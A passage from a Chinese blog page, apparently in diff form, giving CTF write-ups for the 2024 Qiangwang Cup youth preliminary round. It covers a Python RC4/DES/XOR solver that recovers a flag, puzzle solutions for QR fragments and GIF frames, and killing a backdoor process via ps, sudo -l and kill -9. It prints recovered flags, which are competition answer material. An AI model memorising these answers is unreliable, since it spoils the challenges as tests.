class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ARC4, DES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> Crypto.Random <span class="hljs-keyword">import</span> get_random_bytes<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_encrypt</span>(<span class="hljs-params">plaintext, key</span>):<br>    cipher = ARC4.new(key.encode())  <br>    <span class="hljs-keyword">return</span> cipher.encrypt(plaintext.encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">des_encrypt</span>(<span class="hljs-params">plaintext, key</span>):<br>    des = DES.new(key.encode(), DES.MODE_ECB)  <br>    padded_data = pad(plaintext, DES.block_size)  <br>    <span class="hljs-keyword">return</span> des.encrypt(padded_data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor_data</span>(<span class="hljs-params">data1, data2</span>):<br>    length = <span class="hljs-built_in">min</span>(<span class="hljs-built_in">len</span>(data1), <span class="hljs-built_in">len</span>(data2))<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([data1[i] ^ data2[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length)])<br><br>data = <span class="hljs-string">&quot;a4c3f8927d9b8e6d6e483fa2cd0193b0a6e2f19c8b47d5a8f3c7a91e8d4b9f67&quot;</span><br>key = <span class="hljs-string">&quot;flagflag&quot;</span> <br><br>rc4_encrypted = rc4_encrypt(data, key)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;RC4 Encrypted Data: <span class="hljs-subst">&#123;rc4_encrypted.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br><br>hex_string = <span class="hljs-string">&quot;3f79a0583bf843d5c2bf868788200059870ce7d2e93e3566b46ed0ea809ff18eb28e12a0718afca8c3af&quot;</span><br>hex_data = <span class="hljs-built_in">bytes</span>.fromhex(hex_string)<br><br>des_encrypted = des_encrypt(rc4_encrypted, key)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;DES Encrypted Data (EBC): <span class="hljs-subst">&#123;des_encrypted.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br><br>xor_result = xor_data(des_encrypted, hex_data)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;XOR Result: <span class="hljs-subst">&#123;xor_result.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">try</span>:<br>    xor_result_str = xor_result.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;XOR Result as String: <span class="hljs-subst">&#123;xor_result_str&#125;</span>&quot;</span>)<br><span class="hljs-keyword">except</span> UnicodeDecodeError:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;XOR result contains non-printable characters, cannot convert to a string.&quot;</span>)<br><br></code></pre></td></tr></table></figure>
+
+<p>跑出来有个不可见字符，十六个字符爆破出flag</p>
+<p><img src="https://n0o0b-blog.oss-cn-nanjing.aliyuncs.com/img/202411242142469.png" srcset="/img/loading.gif" lazyload alt="image-20241124214253419"></p>
+<p>flag{b92d40df-840a-43a8-bdb4-5de79eca13f4}</p>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="签到漫画"><a href="#签到漫画" class="headerlink" title="签到漫画"></a>签到漫画</h2><p>四个栏目，每个最后一张是二维码碎片，拼起来扫描得到flag</p>
+<p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/image-20241124135442981.png" srcset="/img/loading.gif" lazyload alt="image-20241124135442981"></p>
+<h2 id="whitepic"><a href="#whitepic" class="headerlink" title="whitepic"></a>whitepic</h2><p>gif帧分离</p>
+<p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/image-20241124142256302.png" srcset="/img/loading.gif" lazyload alt="image-20241124142256302"></p>
+<p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/image-20241124142318564.png" srcset="/img/loading.gif" lazyload alt="image-20241124142318564"></p>
+<h2 id="删除后门用户2"><a href="#删除后门用户2" class="headerlink" title="删除后门用户2"></a>删除后门用户2</h2><p>进去ps -ef 看了一下 有一个叫&#x2F;usr&#x2F;bin&#x2F;b的进程</p>
+<p>看了一下是一个后门代码</p>
+<p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/image-20241124133214048.png" srcset="/img/loading.gif" lazyload alt="image-20241124133214048"></p>
+<p>sudo -l 看了一下有kill权限，直接kill -9 22</p>
+<p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/image-20241124133303982.png" srcset="/img/loading.gif" lazyload alt="image-20241124133303982"></p>
+<p>然后和队友一起在疯狂删，莫名奇妙就删掉了成功过了</p>
+<p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/image-20241124133447293.png" srcset="/img/loading.gif" lazyload alt="image-20241124133447293"></p>
+<p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/image-20241124133502666.png" srcset="/img/loading.gif" lazyload alt="image-20241124133502666"></p>
+<h2 id="问卷"><a href="#问卷" class="headerlink" title="问卷"></a>问卷</h2><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/image-20241124140747634.png" srcset="/img/loading.gif" lazyload alt="image-20241124140747634"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctf/" class="print-no-link">#ctf</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2024强网杯青少赛初赛</div>
+      <div>https://0ran9ewww.github.io/2024/11/26/强网杯/强网杯青少赛初赛/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>orange</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年11月26日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/11/26/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/2024/" title="极客大挑战2024复现">
+                        <span class="hidden-mobile">极客大挑战2024复现</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> <p>本 blog 由 dkdun 支持</p> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+ 
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/js/DynamicLine.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
+
+<!--浏览器搞笑标题-->
+<script type="text/javascript" src="\js\FunnyTitle.js"></script>
+<!--鼠标点击礼花特效-->
+<script async src="/js/fireworks.js"></script>
